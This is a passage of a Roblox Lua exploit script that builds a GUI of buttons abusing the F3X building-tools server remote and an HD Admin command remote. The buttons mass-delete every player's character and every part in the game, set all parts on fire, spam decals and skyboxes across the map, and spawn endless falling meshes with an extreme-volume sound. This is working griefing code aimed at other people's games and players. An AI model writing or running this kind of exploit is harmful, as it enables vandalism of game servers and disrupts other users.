		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end

	function spam(id)
		for i,v in game.workspace:GetDescendants() do
			if v:IsA("BasePart") then
				spawn(function()
					SetLocked(v,false)
					SpawnDecal(v,Enum.NormalId.Front)
					AddDecal(v,id,Enum.NormalId.Front)

					SpawnDecal(v,Enum.NormalId.Back)
					AddDecal(v,id,Enum.NormalId.Back)

					SpawnDecal(v,Enum.NormalId.Right)
					AddDecal(v,id,Enum.NormalId.Right)

					SpawnDecal(v,Enum.NormalId.Left)
					AddDecal(v,id,Enum.NormalId.Left)

					SpawnDecal(v,Enum.NormalId.Bottom)
					AddDecal(v,id,Enum.NormalId.Bottom)

					SpawnDecal(v,Enum.NormalId.Top)
					AddDecal(v,id,Enum.NormalId.Top)
				end)
			end
		end 
	end
	spam("105190470033188")
end)
local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 90, 0, 40)
f3x.Position = UDim2.new(0.01, 1, 0.10, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 9, 0)
f3x.Font = Enum.Font.Arial
f3x.Text = "F3X"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 19
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()

	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";btools")
	RequestCommand:InvokeServer(";buildingTools")

end)
local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 90, 0, 40)
f3x.Position = UDim2.new(0.77, 1, 0.10, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 9, 0)
f3x.Font = Enum.Font.Arial
f3x.Text = "hell"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 21
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local function applyDecorationToPart(part)
		local argsCreate = {
			[1] = "CreateDecorations",
			[2] = {
				[1] = {
					["Part"] = part,
					["DecorationType"] = "Fire"
				}
			}
		}

		local argsSync = {
			[1] = "SyncDecorate",
			[2] = {
				[1] = {
					["Part"] = part,
					["DecorationType"] = "Fire",
					["Size"] = 20
				}
			}
		}

		local buildingTools = nil
		local player = game:GetService("Players").LocalPlayer

		-- Search for the tool in Character and Backpack
		for _, item in pairs(player.Character:GetChildren()) do
			if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
				buildingTools = item
				break
			end
		end

		if not buildingTools then
			for _, item in pairs(player.Backpack:GetChildren()) do
				if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
					buildingTools = item
					break
				end
			end
		end

		if buildingTools then
			buildingTools.SyncAPI.ServerEndpoint:InvokeServer(unpack(argsCreate))
			buildingTools.SyncAPI.ServerEndpoint:InvokeServer(unpack(argsSync))
		elseif not warned then
			warn("Building tool not found inside player's inventory or backpack!")
			warned = true
		end
	end

	local function applyDecorationToAllParts(workspaceObject)
		for _, obj in pairs(workspaceObject:GetDescendants()) do
			if obj:IsA("Part") or obj:IsA("MeshPart") then
				applyDecorationToPart(obj)
			end
		end
	end

	applyDecorationToAllParts(workspace)
end)
local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 90, 0, 40)
f3x.Position = UDim2.new(0.01, 1, 0.17, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 9, 0)
f3x.Font = Enum.Font.Arial
f3x.Text = "delete all"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 20
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function Color(part,color)
		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color --[[Color3]],
					["UnionColoring"] = false
				}
			}
		}
		_(args)
	end
	function Punish(player)
		char = player.Character
		DestroyPart(char)
	end

	for i,v in game.Players:GetPlayers() do
		--zzspawn(function()
		pcall(function()
			Punish(v)
		end)
		--end)
	end
	wait(0.5)
	local function unanchor(part)
		local buildingTools = nil
		local player = game:GetService("Players").LocalPlayer

		for _, item in pairs(player.Character:GetChildren()) do
			if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
				buildingTools = item
				break
			end
		end

		if not buildingTools then
			for _, item in pairs(player.Backpack:GetChildren()) do
				if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
					buildingTools = item
					break
				end
			end
		end

		if buildingTools then
			local syncAPI = buildingTools:FindFirstChild("SyncAPI")
			if syncAPI then
				local serverEndpoint = syncAPI:FindFirstChild("ServerEndpoint")
				if serverEndpoint then
					local args = {
						[1] = "Remove",
						[2] = {
							[1] = part
						}
					}
					serverEndpoint:InvokeServer(unpack(args))
				end
			end
		end
	end

	local function unanchorAllParts(workspaceObject)
		for _, obj in pairs(workspaceObject:GetDescendants()) do
			if obj:IsA("Part") or obj:IsA("MeshPart") then
				unanchor(obj)
			end
		end
	end

	unanchorAllParts(workspace)
end)
local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 90, 0, 40)
f3x.Position = UDim2.new(0.20, 1, 0.17, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 9, 0)
f3x.Font = Enum.Font.Arial
f3x.Text = "spongebob rain"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 15
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
	-- DO NOT DELETE THIS LEAVE MY CREDIT

	-- Rain Toad Script By ItsKittyyyGD 

	local player = game.Players.LocalPlayer
	local char = player.Character or player.CharacterAdded:Wait()
	local tool

	for i, v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end

	for i, v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end

	local remote = tool.SyncAPI.ServerEndpoint

	function _(args)
		remote:InvokeServer(unpack(args))
	end

	function SetCollision(part, boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end

	function SetAnchor(boolean, part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end

	function CreatePart(cf)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = workspace
		}
		_(args)
	end

	function Resize(part, size, cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end

	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part, meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://" .. meshid
				}
			}
		}
		_(args)
	end

	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://" .. texid
				}
			}
		}
		_(args)
	end

	function MeshResize(part, size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end

	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = workspace.Part
			},
			[3] = stringg
		}
		_(args)
	end

	function Sky(id)
		local hrp = char:WaitForChild("HumanoidRootPart")
		local cf = hrp.CFrame
		CreatePart(CFrame.new(cf.Position + Vector3.new(0, 6, 0)))
		for _, v in workspace:GetDescendants() do
			if v:IsA("BasePart") and v.CFrame.Position == cf.Position + Vector3.new(0, 6, 0) then
				SetAnchor(true, v)
				AddMesh(v)
				SetMesh(v, "14832966960")
				SetTexture(v, id)
				MeshResize(v, Vector3.new(0, 0, 0))
			end
		end
	end

	local function createRainToads()
		while true do
			wait(0.1) -- Here they change the appearance time of the Toads or other meshes
			if player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health > 0 then
				local hrpcf = player.Character.HumanoidRootPart.CFrame
				local x = hrpcf.x
				local z = hrpcf.z
				local randint = math.random(-600, 600)
				local randint2 = math.random(-600, 600)
				local xloc = randint + x
				local zloc = randint2 + z
				local cf = player.Character.HumanoidRootPart.CFrame.y + 400

				spawn(function()
					local newToad = CreatePart(CFrame.new(math.floor(xloc), math.random(cf, cf + 400), math.floor(zloc)))
					for i, v in game.Workspace:GetDescendants() do
						if v.Name == "Part" and v.Parent == workspace and v.CFrame.x == math.floor(xloc) and v.CFrame.z == math.floor(zloc) then
							SetName(v, "kouuhbunga") -- Here the name of the toad changes
							SetAnchor(false, v)
							AddMesh(v)
							Resize(v, Vector3.new(45, 35, 40), v.CFrame)
							MeshResize(v, Vector3.new(45, 35, 40))
							SetMesh(v, "5730254764") -- Here put it A custom mesh
							SetTexture(v, "5730254691") -- X2
							SetCollision(v, true)
							v.Orientation = Vector3.new(0, 0, 0)

							v.CFrame = v.CFrame + Vector3.new(0, 0, 0)

							local sound = Instance.new("Sound", v)
							sound.SoundId = "rbxassetid://1230832372" -- Here the noise or another sound To the toads or other things It works when they appear 
							sound.Volume = 9999999999999999999999999999999999999999999999999999999999999999999999999999999999999
							sound.PlayOnRemove = true
							sound:Destroy()
						end
					end
				end)
			else
				wait(1)
			end
		end
	end

	coroutine.wrap(createRainToads)() 
end)
local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 90, 0, 40)
f3x.Position = UDim2.new(0.39, 1, 0.17, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 9, 0)
f3x.Font = Enum.Font.Arial
f3x.TextScaled = true
f3x.Text = "B2S skybox"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 20
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	--craaa
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function Color(part,color)
		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color --[[Color3]],
					["UnionColoring"] = false
				}
			}
		}
		_(args)
	end
	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}

		_(args)
	end
	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end

	function Sky(id)
		e = char.HumanoidRootPart.CFrame.x
		f = char.HumanoidRootPart.CFrame.y
		g = char.HumanoidRootPart.CFrame.z
		CreatePart(CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,6,0),workspace)
		for i,v in game.Workspace:GetDescendants() do
			if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then
				--spawn(function()
				SetName(v,"Sky")
				AddMesh(v)
				--end)
				--spawn(function()
				SetMesh(v,"111891702759441")
				SetTexture(v,id)
				--end)
				MeshResize(v,Vector3.new(3600, 3600, 3600))
				SetLocked(v,true)
			end
		end
	end
	Sky("118939541671382")
end)
local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 90, 0, 40)
f3x.Position = UDim2.new(0.58, 1, 0.17, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 9, 0)
f3x.Font = Enum.Font.Arial
f3x.Text = "B2S decal"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 20
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function Color(part,color)
		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color --[[Color3]],
					["UnionColoring"] = false
				}
			}
		}
		_(args)
	end
	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}

		_(args)
	end
	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end

	function spam(id)
		for i,v in game.workspace:GetDescendants() do
			if v:IsA("BasePart") then
				spawn(function()
					SetLocked(v,false)
					SpawnDecal(v,Enum.NormalId.Front)
					AddDecal(v,id,Enum.NormalId.Front)

					SpawnDecal(v,Enum.NormalId.Back)
					AddDecal(v,id,Enum.NormalId.Back)

					SpawnDecal(v,Enum.NormalId.Right)
					AddDecal(v,id,Enum.NormalId.Right)

					SpawnDecal(v,Enum.NormalId.Left)
					AddDecal(v,id,Enum.NormalId.Left)

					SpawnDecal(v,Enum.NormalId.Bottom)
					AddDecal(v,id,Enum.NormalId.Bottom)

					SpawnDecal(v,Enum.NormalId.Top)
					AddDecal(v,id,Enum.NormalId.Top)
				end)
			end
		end 
	end
	spam("118939541671382")
end)
local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 90, 0, 40)
f3x.Position = UDim2.new(0.77, 1, 0.17, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 9, 0)
f3x.Font = Enum.Font.Arial
f3x.Text = "toad rain"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 20
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = workspace
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = workspace.Part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = workspace.Part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	hrpcf = player.Character.HumanoidRootPart.CFrame
	while wait(0.1) do
		x = hrpcf.x
		z = hrpcf.z
		randint = math.random(-600,600)
		randint2 = math.random(-600,600)
		xloc = randint + x
		zloc = randint2 + z
		cf = player.Character.HumanoidRootPart.CFrame.y + 400
		spawn(function()
			CreatePart(CFrame.new(math.floor(xloc), math.random(cf,cf+400), math.floor(zloc)))
			for i,v in game.Workspace:GetDescendants() do
				if v.Name == "Part" and v.Parent == workspace and v.CFrame.x == math.floor(xloc) and v.CFrame.z == math.floor(zloc) then
					SetName(v,"b_1337")
					SetAnchor(false,v)
					AddMesh(v)
					Resize(v, Vector3.new(100,100,100),v.CFrame)
					MeshResize(v,Vector3.new(4,4,4))
					SetMesh(v,"5038530279")
					SetTexture(v, "5038530309")
					SetCollision(v,false)
				else
				end
			end	
		end)
	end
end)
local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 90, 0, 40)
f3x.Position = UDim2.new(0.01, 1, 0.24, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 9, 0)
f3x.Font = Enum.Font.Arial
f3x.TextScaled = true
f3x.Text = "shedletsky skybox"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 20
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
